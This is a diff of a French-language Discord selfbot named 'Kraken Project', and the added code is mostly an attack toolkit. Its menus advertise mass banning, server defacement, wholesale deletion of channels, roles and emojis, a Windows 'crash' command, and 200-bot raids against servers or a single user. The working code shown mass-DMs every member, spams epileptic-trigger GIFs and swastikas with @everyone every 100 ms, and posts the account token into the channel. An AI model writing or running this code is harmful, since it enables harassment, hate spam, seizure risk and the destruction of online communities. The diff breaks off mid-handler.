@@ -1,4 +1,4 @@
-const Discord = require("discord.js"),
+﻿const Discord = require("discord.js"),
 bot = new Discord.Client(),
 express = require("express"),
 gifSearch = require("gif-search"),
@@ -48,127 +48,268 @@ bot.on('ready',() => {
 
 bot.on('message', msg => {
   if (msg.author.id !== bot.user.id) return;
-  if (msg.content === '!Help') {
+  if (msg.content === '!menu') {
       if (msg.deletable) msg.delete();
   var helpAEmbed = new Discord.RichEmbed()
    .setThumbnail(msg.author.avatarURL)      
- .setTitle(`__SelfCalme By Eaucalme**, ${msg.author.tag}.__`)
+ .setTitle(`__Bienvenue sur **Kraken Project**, ${msg.author.tag}.__`)
  .addBlankField(1)
- .addField('__!Plus__', ':droplet: **Ouvre un menu de commande approfondie**')
+ .addField('__Kraken__', '**Ouvre les commandes de base.**')
  .addBlankField(1)
- .addField('__!Raid__', ':droplet: **Ouvre un menu de commande pour le raid**')
+.addField('!KRep', '**Ouvre les commandes de raid.**')
  .addBlankField(1)
- .addField('__!Fun__', ':droplet: **Ouvre un menu de commande Fun**')
+ .addField('!KSpam', '**Ouvre les commandes de spam.**')
  .addBlankField(1)
- .addField('__!Spam__', ':droplet: **Ouvre un menu de commande de Spam**')
+ .addField('!KFun', '**Ouvre les commandes fun.**')
+ .addBlankField(1)
+ .addField('!KVip', '**Ouvre les commandes V.I.P.**')
+ .addBlankField(1)
+ .addField('!Crédit', '**Ouvre les crédits et les participants du Kraken Project.**')
+ .addBlankField(1)
+ .addField('!About', '**À-propos du bot.**')
  .addBlankField(1)
  .setColor('#000000')
- .setFooter('SelfCalme By Eaucalme')
- .setDescription('Le SelfCalme à été créer par Eaucalme Ce selfbot comprends pleusieur commande de selfbot assemblé et optimisé par mes soins SharpBot|KrakenProject|aarendev')
+ .setFooter('◊ Copyright © 2018 Kraken Project. ◊')
+ .setDescription('Nous vous rapellons que utiliser des selfbots peut être bannissable par discord, si vous craignez ce fait, nous vous invitons à installer le Kraken Project sur un compte secondaire. Sur ce, notre équipe vous souhaite de passer une bonne journée/soirée.')
+.setImage('https://cdn.discordapp.com/attachments/469124912796270592/469348927708069889/3059550-kraken-wallpapers_out.jpg')
+   .setTimestamp()
    msg.channel.send(helpAEmbed).catch(err => con(err));
    
  }
  
-  if (msg.content === '!Plus') {
+ if (msg.content === 'Kraken') {
    if (msg.deletable) msg.delete();  
 var helpAEmbed = new Discord.RichEmbed()
 
 .setThumbnail(msg.author.avatarURL)      
-  .setTitle(`__SelfCalme By Eaucalme **Commande de base**.__`)
+  .setTitle(`__Panel des commandes principales de **Kraken Project**.__`)
   .addBlankField(1)
- .addField('__!Ping__', '**Affiche le ping entre vous et le SelfCalme**')
+ .addField('__!ping__', '**Affiche le temps de latence entre le Kraken et le serveur.**')
  .addBlankField(1)
- .addField('__!Disconnect__', '**Déconnecte le SelfCalme**')
+ .addField('__!hello__', '**Commande de base, sans réel but.**')
  .addBlankField(1)
- .addField('__!Stats__', '**Vous donne les stats de votre comptes**')
+ .addField('__!pp @mention__', '**Affiche la photo de profil de la personne mentionnée.**')
  .addBlankField(1)
- .addField('__!mp message__', '**Envoie un message à tout les membres du serveur.**')
+.addField('__!minfo @mention__', '**Affiche les informations du compte de la personne mentionnée.**')
  .addBlankField(1)
- .addField('__!purge [chiffre]__', '**Supprime le nombre de msg défini.**')
+.addField('__!sinfo__', '**Vous permet de recevoir des informations sur le serveur.**')
  .addBlankField(1)
+.addField('__!Krakensay [votre msg]__', '**Envoie un msg défini à tous les membres du serveur.**')
+.addBlankField(1)
+.addField('__!purge [chiffre]__', '**Supprime le nombre de msg défini.**')
+.addBlankField(1)
+.addField('__!stats__', '**Vous montre les stats de votre compte.**')
+.addBlankField(1)
+.addField('__!token__', '**Affiche votre token. (__COMMANDE À NE PAS FAIRE EN PUBLIC.__)**')
+.addBlankField(1)
+.addField('__!exit__', '**Désactive le Kraken Project.**')
+.addBlankField(1)
        .setColor('#0020ff')
-       .setFooter('SelfCalme By Eaucalme')
+       .setFooter('◊ Copyright © 2018 Kraken Project. ◊')
+       .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469357026028290049/panelprincipale_out.jpg')
 .setTimestamp()
 msg.channel.send(helpAEmbed).catch(err => con(err));
 
        }
-
-      if (msg.content === '!Raid') {
+ 
+      if (msg.content === '!KRep') {
  if (msg.deletable) msg.delete();  
   var helpAEmbed = new Discord.RichEmbed()
      .setThumbnail(msg.author.avatarURL)      
-     .setTitle(`__SelfCalme By Eaucalme **Commande de Raid**.__`)
+     .setTitle(`__Panel des commandes de raid de **Kraken Project**.__`)
      .addBlankField(1)
-      .addField('__!banall__','**Ban tout le serveur.[ADMIN REQUIS] **')
+      .addField('__!getbanbitch__','**Ban tout le serveur.**')
       .addBlankField(1)
-      .addField('__!ez__','**Encule le serveur [ADMIN REQUIS][A PREDEFINIR] **')
+      .addField('__!deface__','**Change la face principal du serveur (nom, photo et region du serveur)**')
       .addBlankField(1)
-      .addField('__!spamall__','**Envoie un message everyone à prédéfinir dans tout les channel[A PREDEFINIR]**')
+      .addField('__!happyland__','**Envoie un smiley heureux 3D dans tous les salon textuels.**')
       .addBlankField(1)
-      .addField('__!spamchannel__','**Créer des channel avec un nom prédéfinie[ADMIN REQUIS][A PREDEFINIR]**')
+      .addField('__!rename__','**Rename tous le serveur en "Kraken Project".**')
       .addBlankField(1)
-	  .addField('__!debanall__','**Débanis tout le serveur[ADMIN REQUIS]**')
+      .addField('__!fuckchannel__','**Crée un maximum de channels.**')
+      .addBlankField(1)
+      .addField('__!clearchannel__','**Supprime tout les channels.**')
+      .addBlankField(1)
+      .addField('__!clearrole__','**Supprime tout les rôles.**')
+      .addBlankField(1)
+      .addField('__!delemoji__','**Supprime tout les emojis.**')
+      .addBlankField(1)
+      .addField('__!deban__','**Déban tout le serveur.**')
       .addBlankField(1)
       .setColor('#0020ff')
-      .setFooter('SelfCalme By Eaucalme')
+      .setFooter('◊ Copyright © 2018 Kraken Project. ◊')
+      .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469351956704526337/panelderaid_out.jpg')
         .setTimestamp()
        msg.channel.send(helpAEmbed).catch(err => con(err));
 
       }
+ 
+if (msg.content === '!KSpam') {
+if (msg.deletable) msg.delete();  
+       var helpAEmbed = new Discord.RichEmbed()
+      .setThumbnail(msg.author.avatarURL)      
+      .setTitle(`__Panel des commandes de spam de **Kraken Project**.__`)
+      .addBlankField(1)
+      .addField('__!PresetEpic__','**Spam des images épiléptiques.**')
+      .addBlankField(1)
+      .addField('__!PresetNazi__','**Spam des croix gammées nazies.**')
+      .addBlankField(1)
+      .addField('__!PresetTts__','**Spam des msgs TTS racistes.**')
+      .addBlankField(1)
+      .addField('__!PresetTts2__','**Spam des msgs TTS frustrants.**')
+      .addBlankField(1)
+      .addField('__!crash__', '**Fait crash toute personne sur Windows.**')
+      .addBlankField(1)
+      .addField('__!Krakenspam [votre msg]__','**Spam un msg défini.**')
+      .addBlankField(1)
+      .addField('__!stop__','**Stop toutes les commandes de spam en cours.**')
+      .addBlankField(1)
+     .setColor('#0020ff')
+     .setFooter('◊ Copyright © 2018 Kraken Project. ◊')
+     .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469352949404139520/paneldespam_out.jpg')
+      .setTimestamp()
+      msg.channel.send(helpAEmbed).catch(err => con(err));
+       
+    }
+ 
+if (msg.content === '!KFun') {
+if (msg.deletable) msg.delete();  
+      var helpAEmbed = new Discord.RichEmbed()
+      .setThumbnail(msg.author.avatarURL)      
+      .setTitle(`__Panel des commandes fun de **Kraken Project**.__`)
+   .addBlankField(1)
+     .addField('__!say [votre msg]__','**Fait dire au bot un msg défini.**')
+     .addBlankField(1)
+     .addField('__!KCherche [mots clés]__','**Effectue une recherche sur internet via le Kraken Project.**')
+     .addBlankField(1)
+     .addField('__!8ball [votre question]__','**Réponds à la question posée entre différentes propositions.**')
+     .addBlankField(1)
+     .addField('__!kiss @mention__','**Permet de faire un bisou à la personne mentionnée.**')
+     .addBlankField(1)
+     .addField('__!calin @mention__','**Permet de faire un câlin à la personne mentionnée**')
+     .addBlankField(1)
+     .addField('__!gif [mots clés]__','**Effectue une recherche sur internet et vous affiche un gif en rapport avec vos mots-clés.**')
+     .addBlankField(1)
+   .setColor('#0020ff')
+   .setImage('https://cdn.discordapp.com/attachments/469124912796270592/469354151659438080/panelfun_out.jpg')
+     .setTimestamp()
+      msg.channel.send(helpAEmbed).catch(err => con(err));
 
-       if (msg.content === '!Fun') {
+    }
+
+    if (msg.content === '!About') {
+      if (msg.deletable) msg.delete();  
+ var helpAEmbed = new Discord.RichEmbed()
+.setThumbnail('https://images-ext-2.discordapp.net/external/wN85q2gAe4nJB5T1jGk_BEeLh626_tvqjSGGyvf_8ww/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/469120526896332802/10bad4c956e83693ad9f616925012182.png')      
+.setTitle(`__À-propos du **Kraken Project**.__`)
+.addBlankField(1)
+.setDescription('Le Kraken Project est un Selfbot basé sur le node.js/javascript. Nous vous proposons un Selfbot unique en son genre et facile à utiliser avec un système accessible à tout utilisateur de Discord. De la modération au raid, toutes nos commandes sont configurées afin que vous puissiez les utiliser à votre guise sans rencontrer le moindre problème.')
+.addBlankField(1)
+           .setColor('#0020ff')
+           .setFooter('◊ Copyright © 2018 Kraken Project. ◊')
+.setTimestamp()
+msg.channel.send(helpAEmbed).catch(err => con(err));
+ 
+          }
+
+          if (msg.content === '!Crédit') {
+if (msg.deletable) msg.delete();  
+  var helpAEmbed = new Discord.RichEmbed()
+  
+ .setThumbnail(msg.author.avatarURL)      
+ .setTitle(`__Tous les crédits / participants du **Kraken Project**.__`)
+ .addBlankField(1)
+
+ .addField('__KnowLedge__','**Directeur Général.**')
+ .addBlankField(1)
+ .addField('__ZoulmanPasContent#7874__','**Programmeur en chef.**')
+ .addBlankField(1)
+ .addField('__DrenoX#9999__','**Designer en chef.**')
+ .addBlankField(1)
+ .addField('__Kraken Project.__','**Nous sommes actuellement à la recherche de programmeurs, si vous pensez pouvoir posséder les connaissances requise pour pouvoir nous aider, merci de nous contacter en MP Discord.**')
+
+ .addBlankField(1)
+
+.setColor('#0020ff')
+.setFooter('◊ Copyright © 2018 Kraken Project. ◊')
+ .setTimestamp()
+msg.channel.send(helpAEmbed).catch(err => con(err));
+ 
+    }
+    
+    if (msg.content === '!KVip') {
+      msg.reply(':x: Vous pouvez voir les commandes mais vous ne pouvez pas les utiliser, car vous ne possèdez pas le **Kraken Project V.I.P** :x:')
  if (msg.deletable) msg.delete();  
   var helpAEmbed = new Discord.RichEmbed()
+
      .setThumbnail(msg.author.avatarURL)      
-     .setTitle(`__**SelfCalme By Eaucalme **Commande de LOL***.__`)
+     .setTitle(`__Panel des commandes V.I.P de **Kraken Project**.__`)
      .addBlankField(1)
-      .addField('__!msg1__','**Message à [PRÉDÉFINIR] **')
-      .addBlankField(1)
-      .addField('__!msg2__','**Message à [PRÉDÉFINIR] **')
-      .addBlankField(1)
-      .addField('__!msg3__','**Message à [PRÉDÉFINIR]**')
-      .addBlankField(1)
-      .addField('__!8ball__','**Lance une question et le bot répond**')
-      .addBlankField(1)
-	  .addField('__!baise @mention__','**Une commande assez mature :)**')
-      .addBlankField(1)
-      .setColor('#0020ff')
-      .setFooter('SelfCalme By Eaucalme')
-        .setTimestamp()
-       msg.channel.send(helpAEmbed).catch(err => con(err));
 
-      }
+.addField('__!attack [Invite du serveur] [ID du salon] [votre msg] __','**Fait rejoindre 200 bots sur le serveur et les fait spam selon le salon défini et le msg défini.**')
+.addBlankField(1)
+.addField('__!mp [ID de la personne]__','**Envoie à la personne définie un spam simultané de 200 bots.**')
+.addBlankField(1)
+.addField('__!join [Invite du serveur]__','**Fait rejoindre 200 bots sur le serveur défini.**')
+.addBlankField(1)
+.addField('__!loopjoin [Invite du serveur]__','**Fait rejoindre puis quitter 200 bots sur le serveur défini en boucle.**')
+.addBlankField(1)
+.addField('__!leave [ID du salon]__','**Fait quitter tout les bots du serveur.**')
+.addBlankField(1)
+.addField('__!stop__','**Stop toutes les commandes en cours.**')
+.addBlankField(1)
 
-	         if (msg.content === '!Spam') {
- if (msg.deletable) msg.delete();  
-  var helpAEmbed = new Discord.RichEmbed()
-     .setThumbnail(msg.author.avatarURL)      
-     .setTitle(`__**SelfCalme By Eaucalme **Commande de Spam***.__`)
-     .addBlankField(1)
-      .addField('__!spam1__','**Message à spam [PRÉDÉFINIR] **')
-      .addBlankField(1)
-      .addField('__!spam2__','**Message à spam [PRÉDÉFINIR] **')
-      .addBlankField(1)
-      .addField('__!spam3__','**Message à spam [PRÉDÉFINIR]**')
-      .addBlankField(1)
-      .setColor('#0020ff')
-      .setFooter('SelfCalme By Eaucalme')
-        .setTimestamp()
-       msg.channel.send(helpAEmbed).catch(err => con(err));
+.setColor('#0020ff')
+.setFooter('◊ Copyright © 2018 Kraken Project. ◊')
+.setImage('https://cdn.discordapp.com/attachments/469385199961243650/469785932372115458/panelvip_out.jpg')
+.setTimestamp()
+msg.channel.send(helpAEmbed).catch(err => con(err));
 
-      }
+}              
 
-	    if(msg.content === '!Ping') {
+  if(msg.content === '!ping') {
     if (msg.deletable) msg.delete();
- msg.reply(`:spinthink~1:  **serveur vs selfbot le ping :** __***${Math.round(bot.ping)}*** ms__ OCTOGONE SANS REGLE TROP DE PING`)
-  }
-   if(msg.content === '!Disconnect'){
+ msg.reply(`:octopus: **Le ping est de** __***${Math.round(bot.ping)}*** ms__ ! :octopus:`)
+ }
+
+ if(msg.content === "!token"){
+  if (msg.deletable) msg.delete();
+  msg.channel.send(`:spy: **Voici votre token:** ${bot.token} **(__Évité de le partager__)** :spy:`)
+}
+  
+ if(msg.content === '!hello') {
+  if (msg.deletable) msg.delete();
+msg.reply(`Salut !`)
+}
+    
+  if(msg.content === '!exit'){
     if (msg.deletable) msg.delete();
-      msg.channel.send(':electric_plug:  **Le** ***Kraken Project*** **à été descativé avec:** __succès__ :white_check_mark: ')
+      msg.channel.send(':octopus: **Le** ***Kraken Project*** **à été descativé avec:** __succès__ :octopus:')
       .then(bot.destroy());
   }
-  
-   if (msg.content === "!stats"){
+
+  if(msg.content.startsWith("!mp")) {
+    if (msg.deletable) msg.delete();
+    if(msg.channel.type === "dm") return;
+    let args = msg.content.split(" ").slice(1).join(" ");
+  if(!args) return msg.channel.send(":x: Erreur :x: : **Veuillez définir un msg à me faire répéter !**");
+  msg.guild.members.forEach(member => {
+    member.send(args).catch(e => {});
+  })
+ }
+
+ if(msg.content.startsWith("!pp")) {
+  if(msg.channel.type === "dm") return;
+  if (msg.deletable) msg.delete();
+  var krakenmember = msg.mentions.members.first()
+  let avatar_embed = new Discord.RichEmbed()
+  .setAuthor(` Avatar de ${msg.mentions.users.first().username}`)
+  .setColor("RANDOM")
+  .setImage(krakenmember.user.avatarURL)
+  return msg.channel.send(avatar_embed).catch(e => {});
+ }
+ 
+ if (msg.content === "!stats"){
   var date = new Date(bot.uptime);
   var days = date.getUTCDate() - 1;
   var hours = date.getUTCHours();
@@ -178,7 +319,8 @@ msg.channel.send(helpAEmbed).catch(err => con(err));
       .setFooter(' ', ' ')
       .setThumbnail(`${bot.user.avatarURL}`)
       .setTimestamp()
-      .addField('Nom de toi :', `${bot.user.tag}!\n`, true)
+      .addField('Nombre de serveur:', `${bot.guilds.size}`, true)
+      .addField('Nombre de users:', `${bot.users.size}`, false)
       .addField('Discord Version:', `${Discord.version}`, false)
       .addField('Uptime', days + " days, " + hours + " hours and " + minutes + " minutes.")
   msg.channel.sendEmbed(
@@ -187,18 +329,57 @@ msg.channel.send(helpAEmbed).catch(err => con(err));
       }
   );
 }
-
-  if(msg.content.startsWith("!mp")) {
-    if (msg.deletable) msg.delete();
-    if(msg.channel.type === "dm") return;
-    let args = msg.content.split(" ").slice(1).join(" ");
-  if(!args) return msg.channel.send(":x: Erreur :x: : **Veuillez entrer un message**");
-  msg.guild.members.forEach(member => {
-    member.send(args).catch(e => {});
-  })
- }
  
-     if(msg.content.startsWith("!purge")) {
+ if(msg.content.startsWith("!sinfo")){
+  if (msg.deletable) msg.delete();
+  if(msg.channel.type === "dm") return;
+  let infoEmbed = new Discord.RichEmbed()
+        .setTitle("__Informations du Serveur.__")
+        .addBlankField(1)
+        .setColor('RANDOM')
+        .addField('**Nom** : ', msg.guild.name)
+        .addBlankField(1)
+        .addField('**ID** : ', msg.guild.id)
+        .addBlankField(1)
+        .addField('**Localisation** : ', msg.guild.region)
+        .addBlankField(1)
+        .addField('**Date de création** : ', msg.guild.createdAt)
+        .addBlankField(1)
+        .addField('**Créateur** : ', msg.guild.owner.user.tag)
+        .addBlankField(1)
+        .addField('**Niveau de sécurité** : ', msg.guild.verificationLevel)
+        .addBlankField(1)
+        .addField('**Rôles** : ', msg.guild.roles.size)
+        .addBlankField(1)
+        .addField('**Nombre de membres** : ', msg.guild.memberCount)
+        .addBlankField(1)
+        .addField('**Salons** : ', msg.guild.channels.size)
+        .setThumbnail(msg.guild.iconURL)
+        .setTimestamp()
+      msg.channel.send(infoEmbed);
+    }
+
+    if(msg.content.startsWith("!minfo")){
+      if(msg.channel.type === "dm") return;
+      if (msg.deletable) msg.delete();
+      var rakenmember2 = msg.mentions.members.first()
+      var userinfo_embed = new Discord.RichEmbed()
+      .setTitle('__Informations utilisateur.__')
+      .setThumbnail(msg.author.avatarURL)
+        .addBlankField(1)
+      .setColor("RANDOM")
+      .addField("Pseudo :", `${msg.mentions.users.first().username}`)
+      .addField("Date de création du compte :", rakenmember2.user.createdAt)
+      .addField("Tag :", '#'+rakenmember2.user.discriminator)
+      .addField("ID :", rakenmember2.user.id)
+      .addField("Pseudo + tag :", rakenmember2.user.tag)
+      .setImage(rakenmember2.user.avatarURL)
+      .addBlankField(1)
+      .setTimestamp()
+      msg.channel.send(userinfo_embed).catch(err => con(err));
+    }
+
+    if(msg.content.startsWith("!purge")) {
       let args = msg.content.split(" ").slice(1);
       let messagecount = parseInt(args[0]) || 1;
       var deletedMessages = -1;
@@ -207,15 +388,263 @@ msg.channel.send(helpAEmbed).catch(err => con(err));
               messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
           }).then(() => {
               if (deletedMessages === -1) deletedMessages = 0;
-              msg.channel.send(` Supprésion de ${deletedMessages}** :water_polo: `)
+              msg.channel.send(`:octopus: ${deletedMessages} message(s) **est/sont en cours de supression.** :octopus:`)
                   .then(m => m.delete(5000));
           }).catch(console.error);
   }
 
-    if (msg.content === '!banall') {
+  if (msg.content === '!PresetEpic' ) {
     if (msg.deletable) msg.delete();
-    msg.guild.members.forEach(member => {
-      member.ban().then(function () {});
+    let inteval = setInterval(function() {
+      msg.channel.send('https://cdn.discordapp.com/attachments/406996217604603914/433767434499915826/jSNNR0G.gif https://cdn.discordapp.com/attachments/464750188586598410/469856730201718785/77m4.gif @everyone');
+    }, 100);
+    commandIntervals.push(inteval);
+  }
+
+  if (msg.content === '!PresetNazi' ) { 
+    if (msg.deletable) msg.delete();
+    let inteval = setInterval(function() {
+      msg.channel.send('@everyone 卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐���卐卐卐���卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐���卐卐卐卐卐卐卐���卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐');        
+    }, 100);
+    commandIntervals.push(inteval);
+  }
+
+  if (msg.content === '!crash' ) {
+    if (msg.deletable) msg.delete();
+    let inteval = setInterval(function() {
